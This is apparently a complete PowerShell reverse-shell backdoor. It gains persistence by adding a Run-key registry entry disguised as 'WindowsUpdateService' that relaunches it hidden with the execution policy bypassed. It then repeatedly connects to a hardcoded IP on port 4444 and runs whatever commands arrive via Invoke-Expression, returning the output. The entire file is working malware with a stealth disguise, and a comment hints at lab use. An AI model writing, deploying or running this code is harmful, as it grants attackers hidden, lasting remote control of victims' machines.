$TargetIP = "172.30.25.89" # CHANGE THIS to your WSL IP
$Port = 4444




$LinkName = "WindowsUpdateService" 
$ScriptPath = $MyInvocation.MyCommand.Path


$CommandToRun = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""

$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

$CurrentValue = Get-ItemProperty -Path $RegPath -Name $LinkName -ErrorAction SilentlyContinue

if (-not $CurrentValue) {
    New-ItemProperty -Path $RegPath -Name $LinkName -Value $CommandToRun -PropertyType String | Out-Null

}

while ( $true ){
    try {
        $Client = New-Object System.Net.Sockets.TcpClient
        $Client.Connect($TargetIP, $Port)
        $Stream = $Client.GetStream()
        $Writer = New-Object System.IO.StreamWriter($Stream)
        $Reader = New-Object System.IO.StreamReader($Stream)
        $Writer.AutoFlush = $true

        # Send initial banner
        $Writer.WriteLine("Connected to $env:COMPUTERNAME")
        $Writer.Write("PS > ") # Fake shell prompt

        while ($Client.Connected) {
            if ($Stream.DataAvailable) {
                $Command = $Reader.ReadLine()
                
                if ($Command -eq "exit") { break }
                
                if ($Command) {
                    # EXECUTION BLOCK
                    try {
                        # Execute command and merge StdOut/StdErr
                        $Result = Invoke-Expression $Command 2>&1 | Out-String
                    } catch {
                        $Result = "Error: $($_.Exception.Message)"
                    }
                    
                    # SEND BACK
                    $Writer.WriteLine($Result)
                    $Writer.Write("PS > ") # Ready for next
                }
            }
            Start-Sleep -Milliseconds 100
        }
    }
    catch { Write-Host "Connection Error: $_" }
    finally { 
        if ($Client) { $Client.Close() } 
    }

    Start-Sleep -Milliseconds 1000
}